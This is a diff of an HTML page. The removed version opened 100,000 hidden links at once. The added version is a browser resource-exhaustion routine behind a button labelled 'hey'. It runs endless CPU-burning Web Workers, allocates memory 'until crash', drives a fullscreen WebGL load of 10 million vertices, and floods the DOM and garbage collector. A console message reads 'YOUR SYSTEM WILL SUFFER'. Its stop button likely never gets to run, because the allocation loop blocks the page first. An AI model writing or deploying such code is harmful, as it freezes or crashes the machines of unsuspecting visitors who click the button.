@@ -1,30 +1,323 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>hello</title>
+  <title>.hey</title>
 </head>
 <body>
-
-
-<button onclick="clickAllLinks()">Click </button>
-
-<div style="visibility: hidden;" id="links">
-    
-    <script>
-        for (let i = 1; i <= 100000; i++) {
-            document.write('<a href="https://example.com/?id=' + i + '" target="_blank">Link ' + i + '</a><br>');
-        }
-    </script>
-</div>
+<h1>.</h1>
+<button onclick="start()">hey</button>
+<button onclick="stop()">.</button>
 
 <script>
-function clickAllLinks() {
-    const links = document.querySelectorAll("#links a");
-    links.forEach(link => {
-        link.click();
-    });
+let workers = [];
+let memoryBlocks = [];
+let running = false;
+let gl, animationId;
+let tortureInterval;
+let maxIntensity = true;
+
+function start() {
+    if (running) return;
+    running = true;
+
+    console.log("🔥 INITIATING MAXIMUM STRESS TEST - YOUR SYSTEM WILL SUFFER 🔥");
+    
+    
+    let cores = navigator.hardwareConcurrency * 2 || 16;
+    
+    for (let i = 0; i < cores; i++) {
+      
+        for (let j = 0; j < 3; j++) {
+            let worker = new Worker(URL.createObjectURL(new Blob([`
+                // Ultra-intensive CPU torture
+                function maximumBurn() {
+                    // Vectorized operations (simulated)
+                    const size = 10000;
+                    let matrixA = new Array(size);
+                    let matrixB = new Array(size);
+                    let result = new Array(size);
+                    
+                    for (let i = 0; i < size; i++) {
+                        matrixA[i] = new Array(size);
+                        matrixB[i] = new Array(size);
+                        result[i] = new Array(size);
+                    }
+                    
+                    // Initialize with chaotic values
+                    for (let i = 0; i < size; i++) {
+                        for (let j = 0; j < size; j++) {
+                            matrixA[i][j] = Math.sin(i * j) * Math.cos(i + j) * Math.tan(i * j * 0.1);
+                            matrixB[i][j] = Math.exp(Math.sin(i)) * Math.log(Math.abs(j) + 1);
+                        }
+                    }
+                    
+                    // Matrix multiplication (O(n³) complexity)
+                    function multiplyMatrices() {
+                        for (let i = 0; i < size; i++) {
+                            for (let j = 0; j < size; j++) {
+                                let sum = 0;
+                                for (let k = 0; k < size; k++) {
+                                    sum += matrixA[i][k] * matrixB[k][j];
+                                    // Extra floating point torture
+                                    sum = Math.pow(sum, 0.5) * Math.sin(sum) / Math.cos(sum + 0.1);
+                                }
+                                result[i][j] = sum;
+                            }
+                        }
+                    }
+                    
+                    // Infinite loop with varying workloads
+                    while (true) {
+                        multiplyMatrices();
+                        
+                        // Cryptographic-style operations
+                        for (let i = 0; i < 1000; i++) {
+                            let hash = 0;
+                            for (let j = 0; j < 10000; j++) {
+                                hash = ((hash << 5) - hash + j) | 0;
+                                hash = Math.imul(hash, 0x9e3779b9);
+                                hash = (hash << 16) | (hash >>> 16);
+                            }
+                        }
+                        
+                        // Prime number calculation (intensive)
+                        for (let num = 2; num < 100000; num++) {
+                            let isPrime = true;
+                            for (let i = 2; i <= Math.sqrt(num); i++) {
+                                if (num % i === 0) {
+                                    isPrime = false;
+                                    break;
+                                }
+                            }
+                        }
+                        
+                        // Float point unit torture
+                        let fpuTorture = 0;
+                        for (let f = 0; f < 1000000; f++) {
+                            fpuTorture += Math.sin(f) * Math.cos(f) * Math.tan(f) * Math.asin(Math.sin(f) * 0.5);
+                            fpuTorture = Math.pow(fpuTorture, Math.sin(f));
+                            fpuTorture = Math.exp(Math.log(Math.abs(fpuTorture) + 1));
+                        }
+                    }
+                }
+                maximumBurn();
+            `], {type: "text/javascript"})));
+            
+            workers.push(worker);
+        }
+    }
+
+    // ========== RAM: AGGRESSIVE ALLOCATION ==========
+    try {
+        // Fill all available RAM until crash
+        while (true) {
+            try {
+                // Allocate massive chunks
+                memoryBlocks.push(new Float64Array(50e6)); // ~400MB each
+                memoryBlocks.push(new Int32Array(100e6)); // ~400MB each
+                memoryBlocks.push(new Uint8Array(200e6)); // ~200MB each
+                
+                // Create memory fragmentation
+                for (let i = 0; i < 100; i++) {
+                    memoryBlocks.push(new ArrayBuffer(1000000 * (i + 1)));
+                }
+                
+                // JavaScript object heap flood
+                for (let i = 0; i < 10000; i++) {
+                    let obj = {};
+                    for (let j = 0; j < 1000; j++) {
+                        obj['prop' + j] = new Array(1000).fill('x'.repeat(1000));
+                    }
+                    memoryBlocks.push(obj);
+                }
+                
+                // String pool flooding
+                for (let i = 0; i < 1000; i++) {
+                    memoryBlocks.push('x'.repeat(100000000)); // 100MB strings
+                }
+            } catch (e) {
+                console.log("RAM filling to capacity...");
+                // Keep trying with smaller allocations
+                for (let i = 0; i < 1000; i++) {
+                    try {
+                        memoryBlocks.push(new ArrayBuffer(1000000)); // 1MB chunks
+                    } catch (e) {
+                        console.log("RAM completely saturated!");
+                        break;
+                    }
+                }
+            }
+        }
+    } catch (e) {
+        console.log("Maximum memory pressure achieved");
+    }
+
+    // ========== GPU: EXTREME RENDERING ==========
+    let canvas = document.createElement("canvas");
+    canvas.width = 4096; // 4K resolution
+    canvas.height = 4096;
+    canvas.style.position = "fixed";
+    canvas.style.top = "0";
+    canvas.style.left = "0";
+    canvas.style.width = "100%";
+    canvas.style.height = "100%";
+    canvas.style.zIndex = "9999";
+    document.body.appendChild(canvas);
+
+    gl = canvas.getContext("webgl2") || canvas.getContext("webgl");
+    if (!gl) return;
+
+    // Create massive vertex buffers
+    const vertexCount = 10000000; // 10 million vertices
+    const vertices = new Float32Array(vertexCount * 3);
+    for (let i = 0; i < vertices.length; i++) {
+        vertices[i] = Math.random() * 2 - 1;
+    }
+    
+    const vertexBuffer = gl.createBuffer();
+    gl.bindBuffer(gl.ARRAY_BUFFER, vertexBuffer);
+    gl.bufferData(gl.ARRAY_BUFFER, vertices, gl.STATIC_DRAW);
+
+    // Create complex shader
+    const vertexShader = gl.createShader(gl.VERTEX_SHADER);
+    gl.shaderSource(vertexShader, `
+        attribute vec3 position;
+        uniform float time;
+        varying vec4 vColor;
+        
+        void main() {
+            vec3 pos = position;
+            // Complex vertex transformations
+            pos.x += sin(pos.y * 10.0 + time) * 0.5;
+            pos.y += cos(pos.z * 10.0 + time) * 0.5;
+            pos.z += sin(pos.x * 10.0 + time) * 0.5;
+            
+            // Perlin noise simulation
+            float noise = 0.0;
+            for (int i = 0; i < 10; i++) {
+                float fi = float(i);
+                noise += sin(pos.x * (fi + 1.0) * 5.0 + time) * 
+                         cos(pos.y * (fi + 1.0) * 5.0 + time) * 
+                         sin(pos.z * (fi + 1.0) * 5.0 + time);
+            }
+            
+            gl_Position = vec4(pos * (1.0 + noise * 0.1), 1.0);
+            vColor = vec4(sin(pos * 10.0 + time), cos(pos * 10.0 + time), 1.0);
+        }
+    `);
+    gl.compileShader(vertexShader);
+
+    const fragmentShader = gl.createShader(gl.FRAGMENT_SHADER);
+    gl.shaderSource(fragmentShader, `
+        precision highp float;
+        varying vec4 vColor;
+        uniform float time;
+        
+        void main() {
+            // Complex fragment operations
+            vec4 color = vColor;
+            for (int i = 0; i < 100; i++) {
+                float fi = float(i);
+                color.r += sin(color.g * fi + time) * cos(color.b * fi + time);
+                color.g += cos(color.r * fi + time) * sin(color.b * fi + time);
+                color.b += sin(color.r * fi + time) * cos(color.g * fi + time);
+            }
+            gl_FragColor = color;
+        }
+    `);
+    gl.compileShader(fragmentShader);
+
+    const program = gl.createProgram();
+    gl.attachShader(program, vertexShader);
+    gl.attachShader(program, fragmentShader);
+    gl.linkProgram(program);
+    gl.useProgram(program);
+
+    // ========== SYSTEM STRESSORS ==========
+    // Cache thrashing
+    let cacheThrasher = new Uint8Array(10 * 1024 * 1024); // 10MB
+    setInterval(() => {
+        for (let i = 0; i < cacheThrasher.length; i += 64) { // Cache line size
+            cacheThrasher[i] = Math.random() * 255;
+        }
+    }, 1);
+
+    // I/O simulation
+    tortureInterval = setInterval(() => {
+        // Create and remove DOM elements rapidly
+        for (let i = 0; i < 1000; i++) {
+            let div = document.createElement('div');
+            div.style.position = 'absolute';
+            div.style.width = '1px';
+            div.style.height = '1px';
+            div.style.backgroundColor = 'red';
+            document.body.appendChild(div);
+            setTimeout(() => div.remove(), 0);
+        }
+        
+        // Trigger garbage collector thrashing
+        let temp = [];
+        for (let i = 0; i < 10000; i++) {
+            temp.push(new Array(1000).fill(Math.random()));
+        }
+        temp = null;
+    }, 10);
+
+    // ========== RENDER LOOP: MAXIMUM PRESSURE ==========
+    let time = 0;
+    function extremeRender() {
+        if (!running) return;
+
+        time += 0.1;
+        
+        // Multiple render passes
+        for (let pass = 0; pass < 5; pass++) {
+            gl.clearColor(Math.random(), Math.random(), Math.random(), 1);
+            gl.clear(gl.COLOR_BUFFER_BIT | gl.DEPTH_BUFFER_BIT);
+            
+            gl.uniform1f(gl.getUniformLocation(program, "time"), time + pass);
+            
+            // Draw millions of vertices
+            gl.drawArrays(gl.POINTS, 0, vertexCount);
+            gl.drawArrays(gl.LINES, 0, vertexCount);
+            gl.drawArrays(gl.TRIANGLES, 0, vertexCount);
+            
+            // Force GPU synchronization
+            gl.finish();
+        }
+
+        animationId = requestAnimationFrame(extremeRender);
+    }
+
+    extremeRender();
+}
+
+function stop() {
+    running = false;
+    maxIntensity = false;
+
+    // Terminate all workers
+    workers.forEach(w => w.terminate());
+    workers = [];
+    
+    // Release memory
+    memoryBlocks = [];
+    
+    // Cancel rendering
+    if (animationId) cancelAnimationFrame(animationId);
+    
+    // Clear intervals
+    clearInterval(tortureInterval);
+    
+    // Force garbage collection if available
+    if (window.gc) {
+        window.gc();
+        window.gc();
+        window.gc();
+    }
+    
+    console.log("Stress test stopped - system may need a moment to recover");
 }
 </script>
-
 </body>
 </html>
